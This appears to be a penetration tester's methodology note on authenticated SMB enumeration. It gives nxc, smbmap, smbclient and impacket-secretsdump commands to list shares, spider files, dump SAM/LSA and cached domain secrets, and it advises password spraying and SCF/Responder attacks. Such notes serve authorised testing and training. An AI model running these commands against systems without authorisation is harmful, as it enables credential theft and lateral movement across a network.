## Goal
With a valid credential, enumerate all shares, spider files, dump secrets, and check for admin. One cred often unlocks the whole box.

> In a domain, validate this cred everywhere and track results (auth-valid ≠ admin) → [[01_credentials_and_spraying]]; once you're local admin (SMB `Pwn3d!` ≈ admin, confirm `whoami /groups` in-session), harvest secrets → [[03_credential_access]]. Whole-domain loop → [[00_AD_METHODOLOGY]]; AD service index → [[00_AD_SERVICES]].

**Checklist**
- [ ] which shares readable/writable with the cred?
- [ ] local admin? (nxc shows Pwn3d!)
- [ ] spidered shares for creds/configs?
- [ ] SAM/LSA dumpable? (if admin)
- [ ] password reuse across users?

# Commands

### Step 1: Shares + admin check
```bash
nxc smb $IP -u <user> -p '<pass>'            # (Pwn3d!) on SMB = code exec -> most likely LOCAL ADMIN
nxc smb $IP -u <user> -p '<pass>' --shares
smbmap -H $IP -u <user> -p '<pass>'
```

`STATUS_PASSWORD_MUST_CHANGE`, `STATUS_PASSWORD_EXPIRED`, or password must change means the credential is valid but unusable until changed. Use [[01_credentials_and_spraying#Step 4b: Password must change, valid-but-must-change, or expired|the canonical password-change procedure]].

### Step 2: Spider + dump secrets
```bash
nxc smb $IP -u <user> -p '<pass>' -M spider_plus     # spider all shares -> /tmp/nxc_hosted
nxc smb $IP -u <user> -p '<pass>' --sam --lsa        # dump hashes (needs admin)
impacket-secretsdump <domain>/<user>:'<pass>'@$IP    # full secrets (admin)
```

### Step 3: Access a specific share
```bash
smbclient //$IP/<share> -U '<domain>\<user>%<pass>'
```
Inside the interactive prompt:
```text
dir / ls              # list current remote directory
cd <dir>               # change remote directory
get <file>             # download one file to the LOCAL cwd
mget <pattern>         # download multiple files matching pattern (e.g. mget *.xml)
put <file>             # upload a local file
lcd <local_dir>        # change LOCAL download dir - get/mget land here; easy to miss
recurse                # toggle recursion into subdirs (needed for mget * across folders)
prompt                 # toggle per-file y/n confirm - turn OFF before mget *
pwd                    # show current remote path
```

### Helpline
```bash
# (Pwn3d!) on SMB = SMB code execution -> most likely LOCAL ADMIN -> psexec/wmiexec for a SYSTEM shell (smb_attacks).
#   (SMB exec needs admin, so here it's a strong signal; on WinRM Pwn3d! only means command exec, NOT admin.)
#   confirm before dumping: a SYSTEM/admin shell -> whoami /groups (Administrators / High integrity) then --sam/--lsa.
# READ vs WRITE: nxc --shares shows perms. WRITE to a share others browse -> SCF/Responder (smb_attacks).
# spider_plus dumps found files to /tmp/nxc_hosted/<ip>/ -> grep -ri password/conf/xml there.
# unfamiliar archives/DBs/keys/docs pulled from a share -> triage them with artifact_triage.
# --sam/--lsa need admin; secretsdump also pulls cached domain creds + the machine hash for lateral moves.
# ALWAYS reuse the password: same user may work on ssh/winrm/rdp/mssql, and OTHER users too (spray it).
# recurse ON + prompt OFF + mget * = pull a whole share non-interactively (works for NETLOGON/SYSVOL too).
```
